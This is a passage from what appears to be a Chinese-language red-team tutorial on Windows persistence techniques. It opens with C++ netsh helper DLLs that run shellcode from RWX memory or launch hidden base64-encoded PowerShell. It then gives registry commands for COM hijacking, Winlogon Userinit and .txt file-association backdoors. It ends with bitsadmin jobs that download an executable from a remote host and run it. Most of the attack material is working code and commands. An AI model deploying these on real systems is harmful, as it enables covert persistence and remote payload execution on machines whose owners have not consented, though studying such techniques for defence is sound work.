class="token-line" style="color:#393A34"><span class="token plain">#endif</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// Start a separate thread so netsh remains useful.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD WINAPI ThreadFunction(LPVOID lpParameter)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    LPVOID newMemory;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    HANDLE currentProcess;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SIZE_T bytesWritten;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    BOOL didWeCopy = FALSE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // Get the current process handle </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    currentProcess = GetCurrentProcess();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // Allocate memory with Read+Write+Execute permissions </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    newMemory = VirtualAllocEx(currentProcess, NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (newMemory == NULL)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return -1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // Copy the shellcode into the memory we just created </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&amp;buf, sizeof(buf), &amp;bytesWritten);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (!didWeCopy)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return -2;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // Yay! Let&#x27;s run our shellcode! </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ((void(*)())newMemory)();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return 1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// define the DLL handler &#x27;InitHelpderDll&#x27; as required by netsh.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// See https://msdn.microsoft.com/en-us/library/windows/desktop/ms708327(v=vs.85).aspx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extern &quot;C&quot; __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    //make a thread handler, start the function as a thread, and close the handler </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    HANDLE threadHandle;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    CloseHandle(threadHandle);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // simple testing by starting calculator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    system (&quot;start calc&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // return NO_ERROR is required. Here we are doing it the nasty way</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="Netsh帮助程序DLL" src="/assets/images/894761-20191111140738377-147276156-0a46ce7a49cacc7bc4c20522fb905fd3.png" width="1024" height="578" class="img_ev3q"></p>
<p>与上述方法类似，<a href="https://github.com/rtcrowley" target="_blank" rel="noopener noreferrer">rtcrowley</a>在他的<a href="https://github.com/rtcrowley/Offensive-Netsh-Helper" target="_blank" rel="noopener noreferrer">Github</a>存储库中发布了该方法的PowerShell版本。以下代码可用于执行PowerShell Base64编码的有效负载，并支持两个选项。</p>
<div class="language-C++ language-c++ codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c++ codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;stdio.h&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#include &lt;windows.h&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD WINAPI YahSure(LPVOID lpParameter)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    //Option 1: Quick and simple. Opens 1 PS proc &amp; briefly displays window. Set payload to b64 unicode.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    system(&quot;start C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -win hidden -nonI -nopro -enc \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                SQBmACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAQgBsAGUALgBQAFMAVgBFAFIAcwBpAG8ATgAuACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    //Option 2: Execute loaded b64 into a reg key value. Will spin up a few etra procs, but will not open an extra window.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    //system(&quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $x=((gp HKLM:SOFTWARE\\Microsoft\\Notepad debug).debug); \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                powershell -nopro -enc $x 2&gt; nul&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return 1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//Custom netsh helper format</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extern &quot;C&quot; __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    HANDLE hand;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    hand = CreateThread(NULL, 0, YahSure, NULL, 0, NULL);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    CloseHandle(hand);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return NO_ERROR;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="Netsh Helper DLL – PowerShell方法" src="/assets/images/894761-20191111140809726-1480702117-d249d0718b28cea95cb1af9df74f5616.png" width="1024" height="527" class="img_ev3q"></p>
<p>执行“ <strong>netsh</strong> ”实用程序并使用“ <strong>add helper</strong> ”命令加载系统中的两个DLL都将执行集成的有效负载。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">netsh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add helper C:\Users\pentestlab\Desktop\NetshHelperBeacon</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add helper C:\Users\pentestlab\Desktop\NetshPowerShell</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dll</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111140827595-950746634-dba4b7da8a6fc4dde77cb2bbff78ea6d.png" width="1024" height="320" class="img_ev3q"></p>
<p>当执行“ <strong>添加帮助程序</strong> ”命令以加载DLL文件时，将在以下位置创建注册表项。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="Netsh注册表项" src="/assets/images/894761-20191111140925305-901798714-f24020808774a82fc584aa8bf1a71599.png" width="1024" height="435" class="img_ev3q"></p>
<p>应该注意的是，某些可能安装在受感染系统上的VPN客户端可能会自动“ <strong>netsh</strong> ” 启动，因此可能不需要使用其他方法进行持久化。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="com劫持">COM劫持<a href="#com劫持" class="hash-link" aria-label="COM劫持的直接链接" title="COM劫持的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="介绍-1">介绍<a href="#介绍-1" class="hash-link" aria-label="介绍的直接链接" title="介绍的直接链接">​</a></h3>
<p>微软在Windows 3.11中引入了(Component Object Model, COM)，作为一种实现对象的方法，这些对象可以被不同的框架(ActiveX, COM+， DCOM等)使用，并且在不同的Windows环境中允许互操作性，进程间通信和代码重用。COM对象的滥用使安防团队能够代表受信任的进程执行任意代码。执行COM劫持不需要管理员权限，因为HKCU注册表配置单元中的类在HKLM中的类之前执行。唯一影响高完整性进程(提升)的例外情况是，仅从HKLM位置加载对象，以防止特权提升。</p>
<p>有多种方法可以执行代码，但有几种情况下，COM已被用于持久性攻击中，进行横向移动和防御规避。根据恶意代码执行的方式，在COM劫持期间会使用各种注册表子项。具体如下所示：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">InprocServer/InprocServer32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LocalServer/LocalServer32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TreatAs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ProgID</span><br></span></code></pre></div></div>
<p>上述子密钥位于以下注册表组中:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CURRENT_USER\Software\Classes\CLSID</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_LOCAL_MACHINE\Software\Classes\CLSID</span><br></span></code></pre></div></div>
<p>发现COM密钥，以进行劫持</p>
<p><img decoding="async" loading="lazy" alt="image-20210707142345792" src="/assets/images/image-20210707142345792-57afdf54a560cd8b7e0e3fba5c3f382c.png" width="2578" height="1500" class="img_ev3q"></p>
<p>常见的COM劫持手法有：</p>
<ol>
<li><strong>增加缺少的CLSID进行利用</strong></li>
<li><strong>修改原有CLSID加载的程序</strong></li>
<li><strong>替换掉CLSID下加载路径的程序</strong></li>
</ol>
<p>由David Tulis开发的称为<a href="https://github.com/nccgroup/acCOMplice" target="_blank" rel="noopener noreferrer">acCOMplice</a>的PowerShell脚本可以直接检索系统上存在的缺少的库及其CLSID</p>
<p><img decoding="async" loading="lazy" alt="image-20210707142120969" src="/assets/images/image-20210707142120969-eebeb4aec2da6d95d15192f686605860.png" width="2798" height="392" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="持久化">持久化<a href="#持久化" class="hash-link" aria-label="持久化的直接链接" title="持久化的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="计划任务-1">计划任务<a href="#计划任务-1" class="hash-link" aria-label="计划任务的直接链接" title="计划任务的直接链接">​</a></h4>
<p><a href="https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1" target="_blank" rel="noopener noreferrer"><code>Get-ScheduledTaskComHandler</code></a>，该脚本可以检查主机上所有在用户登录时执行并且容易受到COM劫持的预定任务</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Import-Module</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">\</span><span class="token function" style="color:#d73a49">Get-ScheduledTaskComHandler</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">Get-ScheduledTaskComHandler</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="持久性COM劫持的实现" src="/assets/images/1592231802206110-e2f6f1d184dccaa7b030e62606de5b61.png" width="748" height="372" class="img_ev3q"></p>
<p>参数“PersistenceLocations”将检索易受COM劫持的计划任务，这些任务可用于持久性且不需要提升的特权。 CLSID和关联的DLL也将显示在输出中。</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Get-ScheduledTaskComHandler</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">PersistenceLocations</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="持久性COM劫持的实现" src="/assets/images/1592231803832859-648a25ff292571a045989f74bc314ab1.png" width="784" height="458" class="img_ev3q"></p>
<p>任务“CacheTask”在调用时使用“wininet.dll”并具有以下CLSID：<code>{0358B920-0AC7-461F-98F4-58E32CD89148}</code></p>
<p><img decoding="async" loading="lazy" alt="持久性COM劫持的实现" src="/assets/images/1592231803170310-e0ff37c8035b8731d8db4eb870126361.png" width="721" height="486" class="img_ev3q"></p>
<p>调用“ schtasks”实用程序获取存储位置</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">schtasks </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">query </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">XML </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">TN </span><span class="token string" style="color:#e3116c">&quot;\Microsoft\Windows\Wininet\CacheTask&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="持久性COM劫持的实现" src="/assets/images/1592231805174725-b384b636b901cd21b09f89d1ea8917e6.png" width="842" height="532" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="参考文章">参考文章<a href="#参考文章" class="hash-link" aria-label="参考文章的直接链接" title="参考文章的直接链接">​</a></h3>
<ul>
<li><a href="https://www.4hou.com/posts/Mo51" target="_blank" rel="noopener noreferrer">持久性COM劫持的实现</a></li>
<li><a href="https://pentestlab.blog/2020/05/20/persistence-com-hijacking/" target="_blank" rel="noopener noreferrer">Persistence – COM Hijacking</a></li>
<li><a href="https://422926799.github.io/posts/7dc498ec.html" target="_blank" rel="noopener noreferrer">COM劫持学习</a></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="winlogon用户登录初始化">Winlogon用户登录初始化<a href="#winlogon用户登录初始化" class="hash-link" aria-label="Winlogon用户登录初始化的直接链接" title="Winlogon用户登录初始化的直接链接">​</a></h2>
<p>winlogon.exe是windows中非常重要的进程,在用户还没登录系统之前就已经存在,并与密码验证相关的重要任务精密相关。例如，当在用户登录时，Winlogon 进程负责将用户配置文件加载到注册表中</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKLM\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</span><br></span></code></pre></div></div>
<p>对这些注册表项的恶意修改可能导致 Winlogon 加载和执行恶意 DLL 或可执行文件。</p>
<p>命令行修改</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg delete </span><span class="token string" style="color:#e3116c">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v Userinit </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span><span class="token plain">  </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">v </span><span class="token string" style="color:#e3116c">&quot;Userinit&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\system32\cmd.exe,&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">f</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="图片" src="/assets/images/640-20210706165717690-62a393a38725d070fd18655ab8a418b2.png" width="1080" height="611" class="img_ev3q"></p>
<p>powershell一句话修改</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Set-ItemProperty</span><span class="token plain">   </span><span class="token string" style="color:#e3116c">&quot;HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">name Userinit </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">value </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\system32\userinit.exe,C:\Windows\system32\cmd.exe&quot;</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="logon-scripts后门">Logon Scripts后门<a href="#logon-scripts后门" class="hash-link" aria-label="Logon Scripts后门的直接链接" title="Logon Scripts后门的直接链接">​</a></h2>
<p>Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p>
<p>注册表位置:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HKEY_CURRENT_USER\Environment</span><br></span></code></pre></div></div>
<p>增加键值对</p>
<p><img decoding="async" loading="lazy" alt="图片" src="/assets/images/640-20210706171727174-6158f20d1cbd46ca734379c9447a310d.png" width="1079" height="480" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="文件关联打开方式">文件关联（打开方式）<a href="#文件关联打开方式" class="hash-link" aria-label="文件关联（打开方式）的直接链接" title="文件关联（打开方式）的直接链接">​</a></h2>
<p>文件关联就是将一种类型的文件与一个可以打开它的程序建立起一种依存关系，一个文件可以与多个应用程序发生关联。可以利用文件的&quot;打开方式&quot;进行关联选择。</p>
<p>我们可以用assoc命令显示或修改文件扩展名关联，我们可以看一下.txt文件的关联。</p>
<p><img decoding="async" loading="lazy" alt="图片" src="/assets/images/640-20210706171822352-9ccb1899d6f7dc2a2a19a10a379995c1.png" width="795" height="370" class="img_ev3q"></p>
<p>用ftype命令显示或修改用在文件扩展名关联中的文件类型。</p>
<p><img decoding="async" loading="lazy" alt="图片" src="/assets/images/640-20210706171834679-f66f88bd37a6f243fd5b8b310806a7cb.png" width="822" height="149" class="img_ev3q"></p>
<p>修改<code>\HKEY_CLASS_ROOT\txtfile\shell\open\command</code>的默认值为我们要执行的程序</p>
<p>修改注册表（管理员权限）</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">reg add </span><span class="token string" style="color:#e3116c">&quot;HKCR\txtfile\shell\open\command&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">ve </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">t REG_EXPAND_SZ </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">d </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\system32\cmd.exe %1&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">f</span><br></span></code></pre></div></div>
<p>再打开txt文件打开的是cmd</p>
<p><img decoding="async" loading="lazy" alt="图片" src="/assets/images/640-20210706171936609-218e6e3a0bfab8ea2e67b8d491bc4c9f.png" width="1080" height="367" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="bitsadmin">Bitsadmin<a href="#bitsadmin" class="hash-link" aria-label="Bitsadmin的直接链接" title="Bitsadmin的直接链接">​</a></h2>
<p>Windows操作系统包含各种实用程序，系统管理员可以使用它们来执行各种任务。这些实用程序之一是后台智能传输服务（BITS），它可以促进文件到Web服务器（HTTP）和共享文件夹（SMB）的传输能力。Microsoft提供了一个名为“ <strong>bitsadmin</strong> ” 的二进制文件和PowerShell cmdlet，用于创建和管理文件传输。</p>
<p>从攻击的角度来看，可以滥用此功能，以便在受感染的主机上下载payload（可执行文件，PowerShell脚本，Scriptlet等）并在给定时间执行这些文件，以在红队操作中保持持久性。但是，与“ <strong>bitsadmin</strong> ” 进行交互需要管理员级别的权限。执行以下命令会将恶意payload从远程位置下载到本地目录。</p>
<p>window7以上自带</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">\bitsadmin</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">transfer backdoor </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">download </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">priority high </span><span class="token string" style="color:#e3116c">&quot;http://192.168.1.106/CM.EXE&quot;</span><span class="token plain"> C:\1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20210714142109258" src="/assets/images/image-20210714142109258-2ce12f87eb79470c4f03117d0b28ed49.png" width="3370" height="1282" class="img_ev3q"></p>
<p>有一个PowerShell cmdlet可以执行相同的任务</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Start-BitsTransfer</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Source </span><span class="token string" style="color:#e3116c">&quot;http://10.0.2.21/pentestlab.exe&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Destination </span><span class="token string" style="color:#e3116c">&quot;C:\tmp\pentestlab.exe&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111110205620-1082423963-6ecbd06a89166a87ee6b789fd168df9a.png" width="1024" height="159" class="img_ev3q"></p>
<p>将文件放入磁盘后，可以通过从<code>bitsadmin</code>实用程序执行以下命令来实现持久性。</p>
<ol>
<li>在创建参数需要作业的名称</li>
<li>该addfile需要文件的远程位置和本地路径</li>
<li>该SetNotifyCmdLine将执行的命令</li>
<li>所述SetMinRetryDelay定义时间回调（秒）</li>
<li>激活传输队列中的新作业或挂起的作业</li>
</ol>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bitsadmin </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">create backdoor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bitsadmin </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">addfile backdoor </span><span class="token string" style="color:#e3116c">&quot;http://192.168.1.106/CM.EXE&quot;</span><span class="token plain">  </span><span class="token string" style="color:#e3116c">&quot;C:\1.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bitsadmin </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">SetNotifyCmdLine backdoor C:\1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe NUL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bitsadmin </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">SetMinRetryDelay </span><span class="token string" style="color:#e3116c">&quot;backdoor&quot;</span><span class="token plain"> 60 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bitsadmin </span><span class="token operator" style="color:#393A34">/</span><span class="token plain">resume backdoor</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/894761-20191111110227491-23710429-02d5e198b96c34378287ffd30af73235.png" width="1024" height="703" class="img_ev3q"></p>
<p>参数<strong>SetNotifyCmdLine</strong>也可以用于通过<a href="https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/" target="_blank" rel="noopener noreferrer">regsvr32</a>实用程序从远程位置执行scriptlet 。这种方法的好处是它不会接触磁盘，并且可以避开将应用程序列入白名单的产品。</p>
